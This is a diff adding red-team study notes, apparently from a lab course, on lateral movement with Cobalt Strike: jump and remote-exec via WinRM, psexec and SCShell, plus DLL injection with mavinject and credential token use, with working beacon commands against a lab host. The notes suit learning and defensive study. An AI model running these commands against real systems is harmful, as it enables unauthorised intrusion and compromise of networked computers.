@@ -1,0 +1,41 @@
+tactic where an adversary attempts to gain access to other copmuters on the network
+cobalt stike provides two base commands for executing such commands:
+  jump: automates all the steps (upload payload, execute, connecting to new beacon, deleting payload)
+        syntax: jump <exploit> <target> <listener> 
+        NOTE: running 'jump' will list all exploits (techniques) 
+  remote-exec: broader capability for executing remote commands
+        syntax: remote-exec <method> <target> <command>
+        NOTE: running 'remote-exec' will list all methods (psexec, winrm, wmi)
+
+windows remote management (WinRM):
+  allows for remote management of copmuters via PowerShell and executes payload entirely in memory
+  e.g. beacon> jump winrm64 lon-ws-1 smb
+  e.g. beacon> remote-exec winrm lon-ws-1 net sessions
+    NOTE: WinRM is the only remote-exec method that returns output!
+
+psexec:
+  allows for process execution via the service control manager
+  e.g. beacon> jump psexec64 lon-ws-1 smb
+  NOTE: these will always run as SYSTEM, it is also the loudest of the laternal movement techniques as it prompts new service creation
+
+custom techniques:
+  we can extend these commands to include custom scripts, DLLs, etc.
+  this project, https://github.com/Mr-Un1k0d3r/SCShell/tree/master/CS-BOF, varies from psexec by modifying an exisiting service instead of creating a new one
+    we can use these by uploading them via Cobalt Strike > Script Manager
+    e.g. beacon> jump scshell64 lon-ws-1 smb
+
+LOLBAS (living of the land binaries and scripts):
+  using scripts, libraries, or binaries native to Windows or that can be downloaded from Microsoft
+  e.g. MavInject allows us to inject libraries into other processes, living in System32/SysWOW64
+         mavinject.exe <PID> /INJECTRUNNING <DLL PATH>
+       we can use remote-exec to list processes running:
+        beacon> remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
+       then we can upload our DLL and use MavInject to inject:
+        beacon> cd \\lon-ws-1\ADMIN$\System32
+        beacon> upload C:\Payloads\smb_x64.dll
+        beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
+
+security logon types:
+  once we have successfully moved laterally, we may notice that errors are thrown during enumeration attempts
+  this is likely due to the Network logon type, used by WinRM and psexec, which does not leave creds in LSASS
+  the solution to this is to populate the beacon session with credentials (make_token, ptt), only if necessary!
